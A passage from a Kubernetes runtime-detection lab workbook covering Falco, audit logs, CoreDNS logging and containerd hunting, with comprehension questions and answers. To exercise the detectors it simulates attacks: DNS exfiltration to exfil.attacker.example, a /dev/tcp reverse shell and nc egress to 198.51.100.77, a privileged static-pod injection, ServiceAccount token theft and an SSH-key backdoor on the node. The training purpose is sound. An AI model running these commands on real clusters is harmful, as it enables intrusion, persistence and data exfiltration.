       open_read and cks_etcd_data_dir and not proc.name in (etcd)
     output: >
       Raw etcd data accessed (proc=%proc.name cmd=%proc.cmdline file=%fd.name
       user=%user.name uid=%user.uid parent=%proc.pname container=%container.name)
     priority: CRITICAL
     tags: [host, data, mitre_collection, T1005]

   - rule: Etcd Snapshot Taken
     desc: etcdctl snapshot save invoked - full cluster state, every Secret, in one file.
     condition: >
       spawned_process and proc.name in (etcdctl, etcdutl) and proc.cmdline contains "snapshot"
     output: >
       etcd snapshot invoked (cmd=%proc.cmdline user=%user.name uid=%user.uid
       parent=%proc.pname cwd=%proc.cwd)
     priority: CRITICAL
     tags: [host, data, mitre_collection, T1005]
   EOF
   sudo falco --validate /etc/falco/rules.d/cks-6.2-data.yaml && sudo systemctl restart falco-modern-bpf
   ```

6. Find every Pod that still mounts a projected token it does not need — each one is unnecessary credential exposure and therefore unnecessary detection load:

   ```bash
   kubectl get pods -A -o json | jq -r '
     .items[]
     | select(.spec.automountServiceAccountToken != false)
     | select([.spec.volumes[]? | select(.projected.sources[]?.serviceAccountToken)] | length > 0)
     | "\(.metadata.namespace)/\(.metadata.name)\tsa=\(.spec.serviceAccountName)"' | head -20
   ```

7. Correlate the two halves of a credential theft. First the token was read on the node (Falco, Exercise 3), then it was *used* against the API (audit log). Join them on time and identity:

   ```bash
   sudo jq -c 'select(.user.username=="system:serviceaccount:prod:app-sa")
     | {t:.requestReceivedTimestamp, ip:.sourceIPs[0], verb:.verb,
        res:.objectRef.resource, code:.responseStatus.code, ua:.userAgent}' \
     /var/log/kubernetes/audit/audit.log | tail -10
   ```

### Comprehension questions

- **Q5.1** — Step 2 printed the password in plaintext. Encryption at rest with a `secretbox` or KMS provider would hide it. Does that stop the attacker in step 2? Explain precisely which attacker it stops and which it does not.
- **Q5.2** — In the audit log, a Secret read is logged at `Metadata`. If an attacker reads the same Secret through a *projected volume* in a Pod instead of through the API, does the audit log show anything? Which sensor covers that path?
- **Q5.3** — Your correlation in step 7 shows `sourceIPs[0]` equal to a Pod IP. Why is that field the single most useful pivot for a stolen ServiceAccount token, and what deployment topology destroys its value?
- **Q5.4** — The `Etcd Snapshot Taken` rule triggers on `proc.cmdline contains "snapshot"`. Give two ways an attacker with node root obtains the same data without ever running `etcdctl`, and say which rule in this exercise still catches each.

---

## Exercise 6 — Networks: dropped flows, DNS tunnelling and reverse shells

### Steps

1. Establish a default-deny baseline in `prod`. Without it, there is no such thing as a "dropped flow" to alert on:

   ```bash
   kubectl apply -f - <<'EOF'
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: default-deny-all
     namespace: prod
   spec:
     podSelector: {}
     policyTypes:
       - Ingress
       - Egress
   EOF

   kubectl apply -f - <<'EOF'
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: allow-dns
     namespace: prod
   spec:
     podSelector: {}
     policyTypes: ["Egress"]
     egress:
       - to:
           - namespaceSelector:
               matchLabels:
                 kubernetes.io/metadata.name: kube-system
             podSelector:
               matchLabels:
                 k8s-app: kube-dns
         ports:
           - protocol: UDP
             port: 53
           - protocol: TCP
             port: 53
   EOF
   ```

2. Turn on DNS query logging in CoreDNS — the highest-yield, most CNI-portable network detection you can deploy in a Kubernetes cluster:

   ```bash
   kubectl -n kube-system get cm coredns -o yaml > /tmp/coredns.bak.yaml
   kubectl -n kube-system get cm coredns -o jsonpath='{.data.Corefile}'
   ```

   Insert `log` immediately after `errors`:

   ```bash
   kubectl -n kube-system edit cm coredns
   # .:53 {
   #     errors
   #     log
   #     health { lameduck 5s }
   #     ...
   kubectl -n kube-system rollout restart deploy coredns
   kubectl -n kube-system rollout status deploy coredns
   ```

3. Generate three distinct network threats from the workload:

   ```bash
   # (a) DNS exfiltration / tunnelling: high-cardinality encoded subdomains
   kubectl -n prod exec payments -- sh -c '
     for i in $(seq 1 40); do
       host "$(head -c 24 /dev/urandom | base32 | tr -d = | tr "[:upper:]" "[:lower:]").exfil.attacker.example" >/dev/null 2>&1
     done; echo sent'

   # (b) Blocked egress: default-deny should drop this
   kubectl -n prod exec payments -- sh -c 'timeout 3 nc -zv 198.51.100.77 4444 2>&1 | tail -2'

   # (c) Internal port scan
   kubectl -n prod exec payments -- sh -c 'timeout 20 nmap -sT -Pn -p 22,443,2379,6443,10250 <CP_NODE_IP> 2>&1 | tail -12'
   ```

4. Detect the DNS tunnel by subdomain cardinality — the classic signature is *many unique labels under one parent domain*:

   ```bash
   kubectl logs -n kube-system -l k8s-app=kube-dns --since=15m --tail=-1 \
     | awk '{print $7}' | tr -d '"' | sed 's/\.$//' \
     | awk -F. 'NF>=2 { print $(NF-1)"."$NF"\t"$0 }' \
     | sort -u | cut -f1 | uniq -c | sort -rn | head
   ```

   ```
        40 attacker.example
        14 cluster.local
         3 ubuntu.com
   ```

   Then look at the label length distribution — human domains are short, encoded ones are not:

   ```bash
   kubectl logs -n kube-system -l k8s-app=kube-dns --since=15m --tail=-1 \
     | awk '{print $7}' | tr -d '"' | awk -F. '{print length($1), $0}' | sort -rn | head -5
   ```

5. Detect the blocked flows. **Cilium path:**

   ```bash
   cilium hubble port-forward &
   hubble observe --namespace prod --verdict DROPPED --last 100
   hubble observe --namespace prod --protocol dns --last 50 -o json | jq -c '.l7.dns.query' | head
   hubble observe --namespace prod --from-pod prod/payments --last 200 \
     | awk '{print $NF}' | sort | uniq -c
   ```

   ```
   Aug  5 14:52:11.114: prod/payments:38112 (ID:24581) <> 198.51.100.77:4444 (world) Policy denied DROPPED (TCP Flags: SYN)
   Aug  5 14:52:14.219: prod/payments:38114 (ID:24581) <> 10.0.0.11:6443 (host)  Policy denied DROPPED (TCP Flags: SYN)
   ```

   **CNI-agnostic fallback** — watch the Pod's traffic from the node:

   ```bash
   ssh cks-w1
   PID=$(sudo crictl inspect $(sudo crictl ps --name payments -q) | jq -r '.info.pid')
   sudo nsenter -t "$PID" -n ss -tunap state all | head -20
   sudo nsenter -t "$PID" -n timeout 20 tcpdump -nn -i any 'udp port 53 or tcp[tcpflags] & tcp-syn != 0'
   sudo conntrack -L 2>/dev/null | grep -c SYN_SENT
   ```

6. Confirm the reverse-shell rule from Exercise 3 fires on the real signature:

   ```bash
   # Terminal A on cks-w1
   sudo journalctl -u falco-modern-bpf -f
   # Terminal B
   kubectl -n prod exec payments -- sh -c 'timeout 5 sh -i >/dev/tcp/198.51.100.77/4444 0>&1' 2>/dev/null; echo tried
   ```

7. Restore CoreDNS:

   ```bash
   kubectl -n kube-system apply -f /tmp/coredns.bak.yaml
   kubectl -n kube-system rollout restart deploy coredns
   ```

### Comprehension questions

- **Q6.1** — Why is DNS the highest-yield network detection in a Kubernetes cluster, even when a default-deny egress policy is in force? Tie your answer to the `allow-dns` policy you wrote.
- **Q6.2** — `hubble observe --verdict DROPPED` produced entries. A colleague argues the drop proves prevention worked, so no alert is needed. Rebut this in terms of what a drop tells you about the *state of the workload*.
- **Q6.3** — Core Kubernetes `NetworkPolicy` has no logging action at all. Name the two mechanisms by which you nonetheless obtain per-flow verdicts, and state the dependency each one introduces.
- **Q6.4** — The reverse shell in step 6 used bash's `/dev/tcp` pseudo-device, which issues no `execve` for `nc`. Explain why the `STDIO Redirected To Network Socket` rule still fires while a rule matching `proc.name = nc` would not.

---

## Exercise 7 — Workloads: rogue containers, drift and static-Pod injection

The API server only knows about workloads the API server created. This exercise finds the rest.

### Steps

1. Compare the runtime's view with the API's view. Any container missing the kubelet's Pod labels was **not** created by Kubernetes:

   ```bash
   ssh cks-w1
   sudo crictl ps -o json | jq -r '
     .containers[]
     | [ .metadata.name,
         (.labels["io.kubernetes.pod.namespace"] // "NO-K8S-LABEL"),
         (.labels["io.kubernetes.pod.name"] // "NO-K8S-LABEL"),
         .image.image ] | @tsv' | column -t
   ```

2. Look one level deeper. `crictl` only shows the CRI namespace; `ctr` sees every containerd namespace, including ones the kubelet never queries:

   ```bash
   sudo ctr namespaces list
   for ns in $(sudo ctr namespaces list -q); do
     echo "== namespace: $ns"
     sudo ctr -n "$ns" containers list
   done
   ```

   ```
   NAME    LABELS
   k8s.io
   default

   == namespace: k8s.io
   CONTAINER   IMAGE                                   RUNTIME
   3f2a...     registry.k8s.io/pause:3.10              io.containerd.runc.v2
   == namespace: default
   CONTAINER   IMAGE                                   RUNTIME
   miner01     docker.io/library/alpine:3.20           io.containerd.runc.v2
   ```

3. Cross-check with cgroups. Every kubelet-managed container lives under `kubepods.slice`; anything else running as a container does not:

   ```bash
   sudo find /sys/fs/cgroup/kubepods.slice -maxdepth 3 -name 'cri-containerd-*.scope' | wc -l
   sudo crictl ps -q | wc -l
   sudo systemd-cgls --no-pager | grep -v kubepods | grep -iE 'containerd-|runc' | head
   ```

4. Hunt resource-hijacking behaviour at the node level:

   ```bash
   sudo crictl stats --output table
   ps -eo pid,ppid,pcpu,etimes,comm,args --sort=-pcpu | head -8
   sudo ss -tnp state established '( dport = :3333 or dport = :4444 or dport = :14444 )'
   ```

5. Detect static-Pod injection — the classic node-to-cluster persistence step:

   ```bash
   # Simulate the attacker
   sudo tee /etc/kubernetes/manifests/kube-sysmon.yaml >/dev/null <<'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: kube-sysmon
     namespace: kube-system
   spec:
     hostNetwork: true
     hostPID: true
     containers:
       - name: sysmon
         image: docker.io/library/alpine:3.20
         command: ["sleep", "3600"]
         securityContext:
           privileged: true
         volumeMounts:
           - name: host
             mountPath: /host
     volumes:
       - name: host
         hostPath:
           path: /
   EOF
   ```

   Now detect it from three independent angles:

   ```bash
   # (a) auditd fired the moment the file was written (Exercise 2)
   sudo ausearch -k k8s_static_pod -i --start recent | grep -E 'proctitle|nametype=CREATE' | tail -4

   # (b) AIDE sees an added entry
   sudo aide --config=/etc/aide/cks.conf --check | sed -n '/Added entries/,/^$/p'

   # (c) The mirror Pod appears in the API with no controller owner
   kubectl -n kube-system get pods -o json | jq -r '
     .items[]
     | select(.metadata.ownerReferences == null
              or (.metadata.ownerReferences[0].kind == "Node"))
     | "\(.metadata.name)\tnode=\(.spec.nodeName)\towner=\(.metadata.ownerReferences[0].kind // "NONE")"'
   ```

6. Sweep the whole cluster for the privileged posture that a rogue workload needs:

   ```bash
   kubectl get pods -A -o json | jq -r '
     .items[]
     | . as $p
     | ($p.spec.containers[] | select(
          .securityContext.privileged == true
          or (.securityContext.capabilities.add // [] | index("SYS_ADMIN"))
          or (.securityContext.capabilities.add // [] | index("SYS_PTRACE"))
       )) as $c
     | "\($p.metadata.namespace)/\($p.metadata.name)\tctr=\($c.name)\tnode=\($p.spec.nodeName)"'

   kubectl get pods -A -o json | jq -r '
     .items[] | select([.spec.volumes[]? | select(.hostPath.path == "/" or .hostPath.path == "/var/run" or .hostPath.path=="/etc")] | length > 0)
     | "\(.metadata.namespace)/\(.metadata.name)\thostPath=\([.spec.volumes[]?.hostPath.path // empty] | join(","))"'
   ```

7. Clean up:

   ```bash
   sudo rm -f /etc/kubernetes/manifests/kube-sysmon.yaml
   kubectl -n kube-system get pod kube-sysmon 2>&1 | tail -1
   ```

### Comprehension questions

- **Q7.1** — In step 2, `miner01` appeared in the `default` containerd namespace. Why does it not appear in `crictl ps`, and why will no admission controller, no PSA label and no NetworkPolicy ever apply to it?
- **Q7.2** — In step 5c you filtered on `ownerReferences[0].kind == "Node"`. Explain what a mirror Pod is and why an attacker who injects a static Pod is nevertheless *visible* in the API — and what they would do to defeat exactly that check.
- **Q7.3** — The `kube-sysmon` manifest sets `hostPID: true` and mounts `/`. Name the specific detection capability that `hostPID: true` grants the attacker *against your own sensors*.
- **Q7.4** — Deleting `/etc/kubernetes/manifests/kube-sysmon.yaml` removed the Pod. Does that constitute remediation of this incident? List what you must check before you can say the node is clean.

---

## Exercise 8 — Capstone: correlate the full attack chain

You now have five independent sensors. This exercise runs one coherent intrusion and forces you to reconstruct it from evidence alone.

### Steps

1. Optionally wire the audit log into Falco so both syscall and API events land in one stream. On `cks-cp`:

   ```bash
   sudo falcoctl artifact install k8saudit
   sudo falcoctl artifact install k8saudit-rules

   sudo tee /etc/kubernetes/audit/webhook.yaml >/dev/null <<'EOF'
   apiVersion: v1
   kind: Config
   clusters:
     - name: falco
       cluster:
         server: http://127.0.0.1:9765/k8s-audit
   contexts:
     - context:
         cluster: falco
         user: ""
       name: default-context
   current-context: default-context
   preferences: {}
   users: []
   EOF
   ```

   Add to the API server manifest:

   ```yaml
       - --audit-webhook-config-file=/etc/kubernetes/audit/webhook.yaml
       - --audit-webhook-batch-max-wait=5s
   ```

   And enable the plugin in `/etc/falco/falco.yaml`:

   ```yaml
   plugins:
     - name: k8saudit
       library_path: libk8saudit.so
       init_config: ""
       open_params: "http://:9765/k8s-audit"
     - name: json
       library_path: libjson.so

   load_plugins: [k8saudit, json]
   ```

2. Run the intrusion. Execute the steps in order and note the wall-clock time of each:

   ```bash
   date -u +%T   # T0
   # (1) Initial access - operator credentials abused for a shell
   kubectl -n prod exec -it payments -- sh -c '
     id; ls /var/run/secrets/kubernetes.io/serviceaccount/'

   # (2) Discovery
   kubectl -n prod exec payments -- sh -c 'env | grep KUBERNETES; cat /etc/resolv.conf'

   # (3) Credential access
   kubectl -n prod exec payments -- sh -c \
     'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/t; wc -c /tmp/t'

   # (4) Privilege escalation - the stolen SA now has cluster-admin (from Ex. 4)
   TOKEN=$(kubectl -n prod exec payments -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   curl -sk -H "Authorization: Bearer $TOKEN" -A "curl/8.5.0" \
     https://127.0.0.1:6443/api/v1/namespaces/kube-system/secrets | jq -r '.items[].metadata.name' | head

   # (5) Lateral movement / escape - privileged Pod pinned to a node
   kubectl apply -f - <<'EOF'
   apiVersion: v1
   kind: Pod
   metadata: {name: node-shell, namespace: prod}
   spec:
     hostPID: true
     nodeName: cks-w1
     containers:
       - name: shell
         image: docker.io/library/alpine:3.20
         command: ["sleep","1800"]
         securityContext: {privileged: true}
         volumeMounts: [{name: host, mountPath: /host}]
     volumes: [{name: host, hostPath: {path: /}}]
   EOF
   kubectl -n prod wait --for=condition=Ready pod/node-shell --timeout=90s

   # (6) Persistence on the node
   kubectl -n prod exec node-shell -- sh -c \
     'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICapstoneProbe atk@lab" >> /host/root/.ssh/authorized_keys'

   # (7) Impact / exfiltration
   kubectl -n prod exec node-shell -- sh -c \
     'timeout 3 nc -w1 198.51.100.77 14444 </dev/null; echo attempted'
   date -u +%T   # T1
   ```

3. Reconstruct the timeline **from evidence only**. For each numbered attack step, produce the query that proves it and the exact evidence line:

   ```bash
   # API-layer evidence
   sudo jq -c 'select(.requestReceivedTimestamp > "2026-08-05T15:00:00Z")
     | select((.objectRef.subresource // "") == "exec"
              or (.objectRef.resource == "pods" and .verb == "create")
              or (.objectRef.resource == "secrets"))
     | {t:.requestReceivedTimestamp, u:.user.username, ip:.sourceIPs[0],
        verb:.verb, res:(.objectRef.resource + "/" + (.objectRef.subresource // "")),
        name:.objectRef.name, ua:.userAgent, code:.responseStatus.code}' \
     /var/log/kubernetes/audit/audit.log

   # Syscall-layer evidence
   sudo journalctl -u falco-modern-bpf --since "15:00" -o cat | grep -E 'Critical|Error'

   # Host-layer evidence
   sudo ausearch -k ssh_keys -i --start recent | grep proctitle | tail -3
   sudo aide --config=/etc/aide/cks.conf --check | head -20

   # Network-layer evidence
   hubble observe --namespace prod --verdict DROPPED --since 15m 2>/dev/null | tail
   ```

4. Fill in the detection scorecard. Mark each row `DETECTED` / `MISSED`, name the sensor, and record the *earliest* evidence timestamp:

   | # | Attack step | MITRE ID | Layer | Sensor that fired | First evidence at | Verdict |
   |---|---|---|---|---|---|---|
   | 1 | `exec` into running Pod | T1609 | users / workloads | | | |
   | 2 | In-container discovery | T1613 | workloads | | | |
   | 3 | SA token read from disk | T1552.001 | data | | | |
   | 4 | Token used against API | T1078.004 | users | | | |
   | 5 | Privileged Pod on chosen node | T1610 / T1611 | workloads | | | |
   | 6 | SSH key written to node root | T1098.004 | physical infra | | | |
   | 7 | Egress to attacker on 14444 | T1496 / T1048 | networks | | | |

5. Compute your mean time to detect and identify the **weakest link** — the step with the longest gap between action and evidence:

   ```bash
   # Earliest evidence timestamp across all sources for a chosen step, e.g. step 3
   sudo journalctl -u falco-modern-bpf --since "15:00" -o short-iso \
     | grep 'SA token read' | head -1
   ```

6. Clean up the whole lab:

   ```bash
   kubectl delete ns prod sre-debug --ignore-not-found
   kubectl delete clusterrolebinding rogue-admin --ignore-not-found
   sudo sed -i '/CapstoneProbe/d' /root/.ssh/authorized_keys
   sudo rm -f /tmp/etcd-exfil.db
   ssh cks-w1 'sudo ctr -n default containers rm miner01 2>/dev/null; true'
   ```

### Comprehension questions

- **Q8.1** — Step 4 used the stolen token from *outside* the Pod, but `sourceIPs[0]` in the audit log shows the control-plane node's IP, not the Pod IP. What is the general lesson about `sourceIPs` as an attribution field, and which audit field remains reliable?
- **Q8.2** — Attack step 5 created a privileged Pod through the API and was logged. Attack step 6 wrote to the node's filesystem through that Pod and produced **no** API event at all. State the general rule this illustrates about where in the chain the API audit log stops being useful.
- **Q8.3** — Your scorecard likely marks step 2 (in-container discovery: `env`, `cat /etc/resolv.conf`) as `MISSED`. Is that a detection failure you should fix? Argue both sides and give your engineering decision.
- **Q8.4** — The whole chain is visible only because five sensors on three different hosts were correlated by hand. Name the two architectural changes that make this correlation survive a real incident, and explain why *neither* of them is "install more rules".

---

<details>
<summary><strong>Answers</strong> — expand only after attempting every block</summary>

### Exercise 1 — Detection surface

**A1.1 —** No. `auditd` `active` means the daemon and the kernel audit subsystem are running and will record the small default rule set (login events, some AVC denials), but `No rules` means **no watches and no syscall filters** for anything Kubernetes-relevant. The daemon is a transport with nothing to transport. `systemctl is-active` is a liveness check, never a coverage check; the coverage check is `auditctl -l` and, for effectiveness, deliberately tripping a rule and finding it with `ausearch -k`.

**A1.2 —** The **users** layer and the **data** layer. Without `--audit-log-path` (or an `--audit-webhook-config-file`) the API server discards every audit event, so there is no record of who authenticated, which identity read which Secret, who created a privileged Pod, who bound `cluster-admin`, or who exec'd into a Pod. Node-level sensors cannot substitute: they see a TLS connection to port 6443 and nothing about its content. The API server audit log is the *only* source of identity-attributed activity in Kubernetes.

**A1.3 —** An attacker who obtains root on a node can read, tamper with, or delete the very evidence of their intrusion — the audit log, the Falco output, the `auditd` log and the AIDE database all sit on the compromised host. The architectural fix is to ship evidence off-node in near real time and make the destination append-only: `--audit-webhook-config-file` for the API server, `program_output`/`http_output` or falcosidekick for Falco, `audisp-remote` for `auditd`, and an AIDE database stored on read-only or remote media. Detection that lives inside the attacker's blast radius is not detection.

**A1.4 —** The kubelet exposes a privileged API — `/pods`, `/exec`, `/run`, `/runningpods` — and **keeps no audit log of its own**. An attacker who reaches port 10250 anonymously can run commands in any container on that node, and the *only* evidence is whatever a syscall sensor happens to catch on that node. None of it appears in the API server audit log, because the API server was never involved. The kubelet API is therefore an identity-layer detection hole, not merely an open port: it lets an attacker act on workloads while bypassing the cluster's single source of attributed truth.

---

### Exercise 2 — Host layer

**A2.1 —** `-p wa` records **w**rites and **a**ttribute changes; `-p rwa` adds **r**ead. For `/etc/kubernetes/manifests/` the threat is *placing* code on the node, which is a write. For `/etc/kubernetes/pki/` the threat is *stealing* the cluster CA and the API server client key, which is a read — an attacker who copies `ca.key` can mint a `system:masters` client certificate that RBAC cannot revoke and that requires a full PKI rotation to invalidate. With `-p wa` on the PKI directory you would see nothing at all during that theft. The cost is volume: read watches on hot paths are expensive, which is why you scope them to genuinely secret material rather than to `/etc` as a whole.

**A2.2 —** Hand over **`auid`** (the audit/login UID). `uid=root` only says the process was running as root at the time, which is true of nearly everything on a Kubernetes node and is trivially reached through `sudo`, setuid binaries, or a privileged container. `auid` is the identity that originally logged in; the kernel stamps it at login and it is **immutable** for the whole process tree, so `sudo` and `su` do not change it. `auid=ubuntu` tells the responder which human account to suspend and which SSH session to correlate. Caveat: `auid` is `unset` (4294967295) for processes with no login ancestry — kubelet-spawned containers, systemd services — which is exactly why the `-F auid>=1000 -F auid!=unset` filters appear on the interactive-behaviour rules and are deliberately absent from `kernel_modules`.

**A2.3 —** `-e 2` sets the audit configuration to **immutable**: no rule can be added, changed or deleted until the next reboot, and attempts are themselves logged. It defeats the standard anti-forensic first move of `auditctl -D`. The cost is that any legitimate rule change requires a node reboot, and it must be the **last line** of the last-loaded rules file, because everything after it is rejected. On a Kubernetes node that reboot is cheap (cordon, drain, reboot), so `-e 2` is the right production setting — enable it once your rules have stabilised.

**A2.4 —** Not a leak. AIDE stores path, metadata and cryptographic hashes, never file contents, so the private keys themselves are not in the database; including them is correct because you *want* to know if the cluster CA key was replaced. The real risk is the **database itself**: an attacker with node root modifies a file and then runs `aide --init` to re-baseline, and every subsequent check reports clean. Mitigations: store the DB off-node or on read-only media, sign or hash the DB and verify the hash from a separate system, run the check from a trusted external scheduler rather than a local cron the attacker can edit, and watch `/var/lib/aide/` with an `auditd` rule so a re-baseline is itself an alert.

**A2.5 —** With `-b 8192`, the kernel backlog fills. `--backlog_wait_time 60000` makes the kernel **throttle the offending processes** (making them wait up to 600 ms per event in 1/100 s units) rather than dropping records — so the first visible effect is severe system-wide slowdown, not evidence loss. If the backlog still overflows, `lost` increments and records are discarded. `-f 1` means "on failure, `printk` a message and keep running"; had it been `-f 2`, the kernel would **panic the node**. So: `lost` climbs, evidence for that window is incomplete, and the node degrades or halts. This is a real attack — flooding the audit subsystem is both a denial of service and an evidence-destruction technique — which is why you size `-b` generously, scope watches narrowly, and alert on `lost > 0` as a first-class signal.

---

### Exercise 3 — Falco

**A3.1 —** `proc.tty != 0` requires a controlling terminal, which means the rule fires for `kubectl exec -it` but **not** for a shell spawned without a TTY: `kubectl exec` without `-t`, a webshell dropped by an RCE in the application, a reverse shell, or a shell launched by a compromised entrypoint. Upstream keeps it because interactive debugging is common and noisy, and the TTY condition removes the largest source of false positives at the cost of the quieter, more dangerous cases. The production answer is to run both: keep upstream's TTY-scoped rule at `NOTICE` for hygiene, and add a separate no-TTY variant at `CRITICAL` scoped to namespaces where a shell should never appear.

**A3.2 —** Without `override`, Falco 0.38+ treats a second document with the same `rule:` name as a **full replacement** of the earlier definition — later files in the load order win, and your intent ("also exclude this namespace") silently becomes "this is now the entire rule", losing every upstream condition. `append: true` is deprecated; on 0.41 it still functions but emits a deprecation warning, and the maintained form is `override: {condition: append}` (also `output: append`, `exceptions: append`, or `replace` for any field). Always run `falco --validate` and, after loading, confirm the effective condition with `falco -L` rather than assuming.

**A3.3 —** Falco names the two ends of a connection by role, not by direction: `fd.cip`/`fd.cport` are the **client** (the side that initiated), `fd.sip`/`fd.sport` are the **server** (the side that accepted). For an outbound connection from a container, the container is the client and the remote mining pool is the server — so the remote port is `fd.sport`. Swapping to `fd.cport` would match on the container's own ephemeral source port, which the kernel assigns from the ephemeral range essentially at random; the rule would almost never fire, and when it did it would fire on a benign connection that happened to draw port 4444 as its source. This is one of the most common real-world Falco rule bugs.

**A3.4 —** Namespaces are cheap and often self-service. If an exception is keyed only on `k8s.ns.name = "sre-debug"`, any attacker who can create a namespace with that name, or who compromises any workload already in it, gets a permanent blind spot — you have published the location of your own blind spot in the rules file. Pairing the namespace with `container.image.repository` narrows it to a known image, and pairing it further with an image **digest** rather than a tag narrows it to known content. The general principle: exceptions should be keyed on attributes the attacker cannot choose. Every exception is an attack surface; write the fewest, narrowest ones you can, and review them like you review RBAC.

**A3.5 —** (a) **Kernel-level activity that does not transit the syscall boundary** — loading an LKM rootkit that hooks or hides from the tracepoints Falco attaches to, or eBPF programs that manipulate what the sensor observes. Covered by the `kernel_modules` `auditd` rule (`init_module`/`finit_module`) from Exercise 2, plus Secure Boot / module signing. (b) **File modifications performed before the sensor started, or through alternative I/O submission paths** such as `io_uring`, which batches operations through a shared ring buffer instead of one syscall per operation. Covered by AIDE's baseline comparison, which detects the *result* rather than the act. The lesson: syscall sensors detect behaviour, integrity tools detect state, and you need both because each one's blind spot is the other's specialty.

**A3.6 —** It is the UID **inside the container's user namespace as seen by the kernel** — for a container without user-namespace remapping, container UID 0 *is* node UID 0, so the process genuinely has root credentials on the host kernel and only namespaces and capabilities constrain it. `user.name=root` is Falco's resolution of UID 0 against the *host's* `/etc/passwd`, not the container's, so the *name* can be misleading while the *number* is authoritative. When triaging: trust `user.uid`, check whether the Pod was privileged or had `hostPID`/`hostNetwork`, and treat `uid=0` in a container as one namespace boundary away from node root, not as a safely sandboxed root.

---

### Exercise 4 — Audit log

**A4.1 —** `requestObject` is populated at level **`Request`** and above; `responseObject` only at **`RequestResponse`**. At `Metadata` you get the who (`user`, `sourceIPs`, `userAgent`), the what (`verb`, `objectRef` with resource/namespace/name), the when (`requestReceivedTimestamp`, `stageTimestamp`) and the outcome (`responseStatus.code`) — but no request body at all, so you cannot see `securityContext.privileged`, the container image, the hostPath mounts, or the `roleRef` of a binding. Any detection that reasons about the *content* of a mutation requires `Request`; that is exactly why the policy raises Pod and workload creation to `Request` while leaving reads at `Metadata`.

**A4.2 —** You give up proof of **which Secret values were actually returned to the client** — with `Metadata` you know `app-sa` performed a `get` on Secret `payments-db` and got a 200, but not the bytes it received. In practice that is enough: for incident response you assume every Secret the identity successfully read is compromised and rotate all of them. `RequestResponse` on Secrets is the wrong call because it writes **every Secret value in plaintext into the audit log** — a file on the control-plane disk, shipped to a log aggregator, replicated to backups and indexed by search. You would convert your detection system into the highest-value credential store in the environment, readable by anyone with log access. Same reasoning applies to `configmaps`, which routinely contain credentials that should have been Secrets.

**A4.3 —** `RequestReceived` is emitted the instant the API server receives the request, *before* authentication, authorization, admission or execution. It is the twin of `ResponseComplete` and roughly doubles log volume for near-zero added information — the response-side event carries everything plus the outcome. The one case where it matters: a request that **never completes** — the API server crashes, is killed, or hangs mid-request — leaves only a `RequestReceived` event. If you are investigating an API server that died under attack, or hunting requests deliberately crafted to crash it, that orphaned event is the only trace the request ever existed.

**A4.4 —** A **401** means authentication itself failed: no valid credential was presented, so the API server never resolved an identity and RBAC was never consulted. A **403** means authentication *succeeded* and authorization then denied the request — the server knew who the caller was and said no. Seeing `system:anonymous` with a `403` therefore proves **anonymous authentication is enabled** (`--anonymous-auth=true`): unauthenticated requests are being successfully bound to the built-in `system:anonymous` identity and evaluated by RBAC. With `--anonymous-auth=false` the same probe returns 401 with no resolved user. Operationally: a burst of 403s from one identity is reconnaissance by a *valid* credential — someone mapping their permissions; a burst of 401s is credential guessing or an expired/rotated token.

**A4.5 —** A 403 only shows an attempt that failed, and legitimate controllers generate 403s constantly through normal probing and optimistic access patterns — low signal, high volume. The User-Agent characterises the **tooling**, and a workload's tooling is deterministic: a Go application using `client-go` sends something like `payments/v2.1 (linux/amd64) kubernetes/$Format` or the client-go default `kubernetes/v1.34.0 (linux/amd64) kubernetes/ab12cd3`. `python-requests/2.32.3` or `curl/8.5.0` from a ServiceAccount that has only ever spoken client-go is *hand-driven tooling using stolen credentials*, and it is a signal on **successful** requests, not just failed ones. Build a per-ServiceAccount User-Agent baseline; the alert on first deviation is one of the highest-precision detections available in the audit log. (It is trivially spoofable, so treat it as high-precision, not high-recall.)

**A4.6 —** **Log rotation flooding.** The attacker never touches the log file; they simply generate enough authorized API traffic — a tight `list pods` loop, a watch storm — to write more than 100 MiB × 10 = ~1 GiB of audit records, which rolls their earlier activity out of the retained backups and off the disk entirely. Retention limits you configured for disk safety become an evidence-destruction primitive. The defeat is architectural, not a tuning change: **ship audit events off-node in real time** via `--audit-webhook-config-file` (or a sidecar/agent tailing the file) to append-only, write-once storage the node's credentials cannot delete. Then also alert on the flood itself — a sudden spike in audit event rate from one identity is a detection, not just an operational anomaly.

---

### Exercise 5 — Data

**A5.1 —** Encryption at rest stops the attacker who obtains the **etcd data files or a snapshot without the API server's encryption key** — a stolen backup, a decommissioned disk, a compromised backup bucket, a restored snapshot in another environment. It does **not** stop the attacker in step 2 if they also have the encryption key, and more importantly it does not stop *any* attacker who can reach the API server with sufficient RBAC, because the API server decrypts transparently on read: `kubectl get secret -o yaml` returns plaintext regardless. It also does nothing against a compromised node, where the kubelet has already materialised the Secret into the container's filesystem. Encryption at rest narrows one specific exfiltration path; it is not a Secret-access control, and the audit log remains the detection for the paths it does not cover.

**A5.2 —** The audit log shows **nothing**. A projected ServiceAccount token or a mounted Secret volume is materialised by the **kubelet** into a `tmpfs` inside the Pod; every subsequent read by the container is an ordinary `openat`/`read` against local memory-backed storage with no API server involvement whatsoever. The only sensor that covers this is a **syscall sensor** — precisely the `ServiceAccount Token Read By Interactive Process` Falco rule from Exercise 3, matching on `fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount`. This is the single most important structural insight of the data layer: the API audit log covers Secret access *through the API*, and syscall monitoring covers Secret access *through the filesystem*. Deploy only one and you have covered half the paths.

**A5.3 —** A ServiceAccount token is a bearer token — it carries no binding to a location — so the identity in the audit log tells you *which* SA was used but nothing about *who* used it. `sourceIPs[0]` is the only field that answers "from where", and when it equals the Pod IP that the SA legitimately runs in, the request is consistent; when the same SA's requests suddenly originate from a different Pod IP, a node IP, or an external address, the token has left its Pod. What destroys this: **any hop that rewrites the source address** — a service mesh egress gateway, a NAT boundary, an API server behind a cloud load balancer or reverse proxy that does not preserve the client address. In those topologies every request appears to come from a handful of infrastructure IPs and the pivot is worthless, which is one of the strongest arguments for **bound, short-lived projected tokens with an `audience`** and for `TokenRequest` expiry over legacy non-expiring Secret-based tokens: if attribution by address is unavailable, shrink the window in which a stolen token is useful. (Note `sourceIPs` is an array — with a trusted proxy configuration the chain is preserved, and `sourceIPs[0]` is the originating client.)

